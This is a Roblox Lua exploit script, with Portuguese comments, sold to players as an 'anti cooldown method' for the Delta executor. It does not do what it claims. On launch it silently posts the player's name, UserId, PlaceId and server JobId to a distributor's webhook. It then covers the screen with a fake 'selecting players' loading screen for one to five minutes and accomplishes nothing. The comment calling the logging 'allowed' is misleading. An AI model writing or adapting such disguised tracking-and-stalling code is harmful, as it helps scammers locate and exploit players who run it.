-- MÉTODO ANTI COOLDOWN
-- DELTA EXECUTOR
-- LOG APENAS DO PRÓPRIO JOGADOR (PERMITIDO)

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

-- 🔗 COLOQUE SUA WEBHOOK AQUI
local WEBHOOK_URL = "SUA_WEBHOOK_AQUI"

-- FUNÇÃO DE LOG
local function sendLog()
	if WEBHOOK_URL == "" then return end

	local data = {
		username = "Anti Cooldown Logger",
		embeds = {{
			title = "Novo Executor",
			color = 16711680,
			fields = {
				{ name = "Player", value = player.Name, inline = true },
				{ name = "UserId", value = tostring(player.UserId), inline = true },
				{ name = "PlaceId", value = tostring(game.PlaceId), inline = true },
				{ name = "JobId", value = tostring(game.JobId), inline = false },
			},
			footer = { text = os.date("%d/%m/%Y %H:%M:%S") }
		}}
	}

	pcall(function()
		HttpService:PostAsync(
			WEBHOOK_URL,
			HttpService:JSONEncode(data),
			Enum.HttpContentType.ApplicationJson
		)
	end)
end

-- ENVIA LOG AO EXECUTAR
sendLog()

-- ================= UI =================

local gui = Instance.new("ScreenGui")
gui.Name = "AntiCooldownUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(0,0,0)

local title = Instance.new("TextLabel", bg)
title.Text = "MÉTODO ANTI COOLDOWN"
title.Size = UDim2.new(1,0,0,80)
title.Position = UDim2.new(0,0,0.2,0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(255,255,255)
title.TextScaled = true
title.Font = Enum.Font.GothamBold

local input = Instance.new("TextBox", bg)
input.Size = UDim2.new(0.6,0,0,50)
input.Position = UDim2.new(0.2,0,0.4,0)
input.PlaceholderText = "Cole o link do servidor aqui"
input.Text = ""
input.TextScaled = true
input.Font = Enum.Font.Gotham
input.BackgroundColor3 = Color3.fromRGB(15,15,15)
input.TextColor3 = Color3.fromRGB(255,255,255)
input.PlaceholderColor3 = Color3.fromRGB(150,150,150)
input.ClearTextOnFocus = false

local button = Instance.new("TextButton", bg)
button.Size = UDim2.new(0.35,0,0,50)
button.Position = UDim2.new(0.325,0,0.52,0)
button.Text = "INICIAR MÉTODO"
button.TextScaled = true
button.Font = Enum.Font.GothamBold
button.BackgroundColor3 = Color3.fromRGB(40,40,40)
button.TextColor3 = Color3.fromRGB(255,255,255)

local loading = Instance.new("Frame", gui)
loading.Size = UDim2.new(1,0,1,0)
loading.BackgroundColor3 = Color3.fromRGB(0,0,0)
loading.Visible = false

local loadingText = Instance.new("TextLabel", loading)
loadingText.Size = UDim2.new(1,0,0,100)
loadingText.Position = UDim2.new(0,0,0.45,0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Selecionando players..."
loadingText.TextScaled = true
loadingText.Font = Enum.Font.GothamBold
loadingText.TextColor3 = Color3.fromRGB(255,255,255)

button.MouseButton1Click:Connect(function()
	if input.Text == "" then return end
	bg.Visible = false
	loading.Visible = true

	local tempo = math.random(60,300) -- 1 a 5 minutos
	task.delay(tempo, function()
		loadingText.Text = "Processo concluído."
		task.wait(2)
		gui:Destroy()
	end)
end)
